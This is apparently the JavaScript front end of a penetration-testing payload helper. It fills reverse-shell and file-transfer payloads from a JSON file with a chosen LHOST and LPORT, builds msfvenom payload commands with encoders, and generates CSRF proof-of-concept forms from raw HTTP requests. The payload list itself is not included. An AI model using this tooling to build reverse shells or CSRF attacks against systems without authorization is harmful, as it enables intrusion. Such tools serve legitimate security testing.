document.addEventListener("DOMContentLoaded", () => {
  fetchPayloads();
});

let allPayloads = {};

// Populate Primary Filter Options
function populatePrimaryFilter() {
  const primaryFilter = document.getElementById("primaryFilter");
  primaryFilter.innerHTML = '<option value="">Select Vulnerability</option>'; // Reset options
  
  Object.keys(allPayloads).forEach(vulnerabilityType => {
      const option = document.createElement("option");
      option.value = vulnerabilityType;
      option.textContent = vulnerabilityType;
      primaryFilter.appendChild(option);
  });
}

function populateMsfvenomBuilder() {
  const payloadDropdown = document.getElementById("payloadDropdownBuilder");
  const encoderDropdown = document.getElementById("encoderDropdownBuilder");
  const formatDropdown = document.getElementById("formatDropdownBuilder");

  // Populate dropdowns from JSON
  const payloads = allPayloads["Msfvenom Builder"]["Payload"] || [];
  const encoders = allPayloads["Msfvenom Builder"]["Encoder"] || [];
  const formats = allPayloads["Msfvenom Builder"]["Format"] || [];

  populateDropdown(payloadDropdown, payloads, "Select a Payload");
  populateDropdown(encoderDropdown, encoders, "Select an Encoder");
  populateDropdown(formatDropdown, formats, "Select a Format");
}

// Helper Function to Populate Dropdowns
function populateDropdown(dropdown, items, placeholder) {
  dropdown.innerHTML = ''; // Clear existing options

  const defaultOption = document.createElement('option');
  defaultOption.value = '';
  defaultOption.textContent = placeholder;
  dropdown.appendChild(defaultOption);

  if (items.length === 0) {
    dropdown.innerHTML = '<option value="">No Options Available</option>';
    return;
  }

  items.forEach(item => {
    const option = document.createElement("option");
    option.value = item;
    option.textContent = item;
    dropdown.appendChild(option);
  });
}

// Update Secondary Filter Options
function updateSecondaryFilter() {
  const primaryFilter = document.getElementById("primaryFilter").value;
  const secondaryFilter = document.getElementById("secondaryFilter");
  const csrfPOCSection = document.getElementById("csrfPOCSection");
  const dynamicInputs = document.getElementById("dynamicInputs");
  const filenameInput = document.getElementById("filenameInput");
  const msfvenomBuilder = document.getElementById("msfvenomBuilder");
  const searchInput = document.getElementById("searchInput");
  const searchButton = document.querySelector(".search-button");
  const searchResults = document.getElementById("searchResults");
  const copyButton = document.getElementById("copyButton");

  secondaryFilter.innerHTML = "";
  dynamicInputs.style.display = "none";
  filenameInput.style.display = "none";
  msfvenomBuilder.style.display = "none";
  csrfPOCSection.style.display = "none";
  copyButton.style.display = "none";
  secondaryFilter.style.display = "inline-block";
  searchInput.style.display = "inline-block";
  searchButton.style.display = "inline-block";
  searchResults.innerHTML = ""; // Clear the results

  if (primaryFilter === "Msfvenom Builder") {
    searchInput.style.display = "none";
    searchButton.style.display = "none";
    secondaryFilter.style.display = "none";
    msfvenomBuilder.style.display = "block"; // Show Msfvenom Builder
    populateMsfvenomBuilder(); // Populate builder dropdowns
    return;
  } 

  if (primaryFilter === "CSRF POC Generator") {
    searchInput.style.display = "none";
    searchButton.style.display = "none";
    secondaryFilter.style.display = "none";
    csrfPOCSection.style.display = "block"; // Show CSRF POC Section
    clearCSRFPOCInputs(); // Clear CSRF POC inputs and generated POC
    generateCSRFPOC(); // Populate builder dropdowns
    return;
  } 

  if (primaryFilter === "Reverse Shell") {
    dynamicInputs.style.display = "flex";
  } else if (primaryFilter === "File Transfer") {
    dynamicInputs.style.display = "flex";
    filenameInput.style.display = "inline-block";
  }

  if (primaryFilter && allPayloads[primaryFilter]) {
    Object.keys(allPayloads[primaryFilter]).forEach(subType => {
      const option = document.createElement("option");
      option.value = subType;
      option.textContent = subType;
      secondaryFilter.appendChild(option);
    });
    secondaryFilter.classList.remove("disabled");
  } else {
    secondaryFilter.innerHTML = '<option>No Options</option>';
    secondaryFilter.classList.add("disabled");
  }
} 

// Function to fetch and load payloads from JSON file
function fetchPayloads() {
  fetch("payloads.json")
    .then(response => response.json())
    .then(data => {
      allPayloads = data;
      populatePrimaryFilter(); // Populate primary filter options after loading data
    })
    .catch(error => console.error("Error loading payloads:", error));
}

function generateMsfvenomCommand() {
  const lhost = document.getElementById("lhostInputBuilder").value.trim();
  const lport = document.getElementById("lportInputBuilder").value.trim();
  const payload = document.getElementById("payloadDropdownBuilder").value;
  const encoder = document.getElementById("encoderDropdownBuilder").value;
  const iterations = document.getElementById("iterationsInputBuilder").value.trim();
  const format = document.getElementById("formatDropdownBuilder").value;
  const output = document.getElementById("outputInputBuilder").value.trim();
  const commandContainer = document.getElementById("generatedCommandContainer");
  const copyButton = document.getElementById("copyCommandButtonBuilder");
  const errorMessage = document.getElementById("error-message");

  if (!lhost || !lport || !payload || !output) {
    errorMessage.textContent = "LHOST, LPORT, Payload, and Output are required fields!";
    errorMessage.style.display = "block";
    return;
  } else {
    errorMessage.textContent = ""; // Clear any previous error
    errorMessage.style.display = "none";
  }

  let command = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -o ${output}`;
  if (format) command += ` -f ${format}`;
  if (encoder) command += ` -e ${encoder}`;
  if (encoder && iterations) command += ` -i ${iterations}`;

  commandContainer.innerHTML = `<p></p><code>${command}</code>`;
  copyButton.style.display = "inline-block"; // Show the copy button
}

function copyMsfvenomCommand() {
  const commandContainer = document.getElementById("generatedCommandContainer");
  const commandText = commandContainer.innerText || "";

  if (commandText) {
    navigator.clipboard
      .writeText(commandText)
      .catch((err) => console.error("Error copying command:", err));
  }
}
function copyMsfvenomCommand() {
  const commandContainer = document.getElementById("generatedCommandContainer");
  navigator.clipboard.writeText(commandContainer.textContent).then(() => {
    alert("Command copied to clipboard!");
  });
}

// Function to generate CSRF POC
function clearCSRFPOCInputs() {
  const requestInput = document.getElementById("requestInput");
  const generatedPOC = document.getElementById("generatedPOC");

  requestInput.value = ""; // Clear input
  generatedPOC.value = ""; // Clear generated POC content
}

//To Print the error message in the console and display it in the UI
function parseRequest(rawRequest) {
  const errorMessage = document.getElementById("error-message");
  clearError(); // Clear any previous error message before starting a new parse

  if (!rawRequest.trim()) {
    // If the input is empty or contains only whitespace, do nothing
    return null;
  }

  try {
    const [headerPart, bodyPart = ""] = rawRequest.split("\n\n");
    const headers = headerPart.split("\n").map(line => line.trim()).filter(Boolean);
    if (headers.length === 0) throw new Error("Request headers are missing.");

    const methodAndUri = headers[0].split(" ");
    if (methodAndUri.length < 2) throw new Error("Invalid request line format.");

    const method = methodAndUri[0];
    const uri = methodAndUri[1];
    const hostHeader = headers.find(h => h.toLowerCase().startsWith("host:"));
    if (!hostHeader) throw new Error("Host header is missing.");

    const host = hostHeader.split(":")[1]?.trim() || "";
    if (!host) throw new Error("Host value is missing in the Host header.");

    const isHTTPS = uri.startsWith("https://") || host.startsWith("https://");
    const baseUrl = `${isHTTPS ? "https" : "http"}://${host}${uri.split("?")[0]}`;

    const params = (method === "POST" ? bodyPart : uri.split("?")[1] || "")
      .split("&")
      .filter(Boolean)
      .map(param => param.split("="))
      .reduce((acc, [key, value]) => {
        acc[key] = decodeURIComponent(value || "");
        return acc;
      }, {});

    return { method, baseUrl, params };
  } catch (err) {
    console.error("Error parsing request:", err.message);
    showError(`Error: ${err.message}`); // Display error message when request is invalid
    return null;
  }
}

function clearError() {
  const errorMessage = document.getElementById("error-message");
  if (errorMessage) {
    errorMessage.textContent = ""; // Clear any previous error message
  }
}

function showError(message) {
  const errorMessage = document.getElementById("error-message");
  if (errorMessage) {
    errorMessage.textContent = message; // Display the error message
  }
}

// Example: Clear error when switching to the next option or triggering a new action
document.getElementById("primaryFilter").addEventListener("click", () => {
  clearError(); // Clear error when the user clicks "Next" or switches to a new step
  // Optionally, add logic for what happens when the next option is selected
});

//Edit only if its needed
// You can also clear the error when focusing on the input field again, or based on any other event:
//document.getElementById("raw-request").addEventListener("focus", () => {
//  clearError(); // Clear error when the user focuses on the input field
//});

function generateCSRFPOC() {
  const requestInput = document.getElementById("requestInput").value.trim();
  const generatedPOC = document.getElementById("generatedPOC");
  const errorMessage = document.getElementById("error-message");
  errorMessage.textContent = ""; // Clear any previous error

  const requestDetails = parseRequest(requestInput);
  if (!requestDetails) {
    generatedPOC.value = "Error: Unable to generate POC. Check your request input.";
    return;
  }

  const { method, baseUrl, params } = requestDetails;
  const formInputs = Object.entries(params)
    .map(([key, value]) => `<input type="hidden" name="${key}" value="${value}" />`)
    .join("\n\t\t");

  const pocHTML = `
<html>
<body>
<form method="${method}" action="${baseUrl}">
${formInputs}
<input type="submit" value="Submit" />
</form>
</body>
</html>`.trim();

  generatedPOC.value = pocHTML;
}

function copyGeneratedPOC() {
  const generatedPOC = document.getElementById("generatedPOC");
  generatedPOC.select();
  document.execCommand("copy");
}

// Executes search based on filters and optional keyword
function executeSearch() {
  const primaryFilter = document.getElementById("primaryFilter").value;
  const secondaryFilter = document.getElementById("secondaryFilter").value;
  const keyword = document.getElementById("searchInput").value.trim().toLowerCase();
  const resultsContainer = document.getElementById("searchResults");
  const errorMessage = document.getElementById("error-message");
  const copyButton = document.getElementById("copyButton");
  const lhostInput = document.getElementById("lhostInput").value; // Get the value
  const lportInput = document.getElementById("lportInput").value;
  const filenameInput = document.getElementById("filenameInput").value;
  
  errorMessage.textContent = "";
  resultsContainer.innerHTML = "";
  copyButton.style.display = "none";

  if (keyword && (!primaryFilter || !secondaryFilter)) {
    errorMessage.textContent = "Please set filters to search with keywords.";
    return;
  }
  if (!primaryFilter || !secondaryFilter) {
    errorMessage.textContent = "Please set filters to search.";
    return;
  }
  
  let filteredPayloads = allPayloads[primaryFilter][secondaryFilter] || [];

   // Replace placeholders if inputs are provided
   if (primaryFilter === "Reverse Shell") {
    filteredPayloads = filteredPayloads.map((payload) =>
      payload.replace(/\[LHOST\]/g, lhostInput || "[LHOST]").replace(/\[LPORT\]/g, lportInput || "[LPORT]")
    );
  } else if (primaryFilter === "File Transfer") {
    filteredPayloads = filteredPayloads.map((payload) =>
      payload
        .replace(/\[LHOST\]/g, lhostInput || "[LHOST]")
        .replace(/\[LPORT\]/g, lportInput || "[LPORT]")
        .replace(/\[File\]/g, filenameInput || "[FILENAME]")
    );
  }
  
  // Filter by keyword if provided
  if (keyword) {
    filteredPayloads = filteredPayloads.filter(payload => payload.toLowerCase().includes(keyword));
  }
  
  // Display filtered payloads or no results message
  if (filteredPayloads.length > 0) {
    filteredPayloads.forEach(payload => {
      const payloadItem = document.createElement("div");
      payloadItem.className = "payload-item";
      payloadItem.textContent = payload;
      resultsContainer.appendChild(payloadItem);
    });
    copyButton.style.display = "inline-block";
  } else {
    resultsContainer.innerHTML = "<p>No payloads found.</p>";
  }
}

function copyPayloads() {
  const resultsContainer = document.getElementById("searchResults");
  const payloadItems = resultsContainer.getElementsByClassName("payload-item");

  if (payloadItems.length === 0) return;

  const payloadText = Array.from(payloadItems).map(item => item.textContent).join("\n");

  navigator.clipboard.writeText(payloadText).catch(err => {
    console.error("Error copying payloads:", err);
  });
}  
    
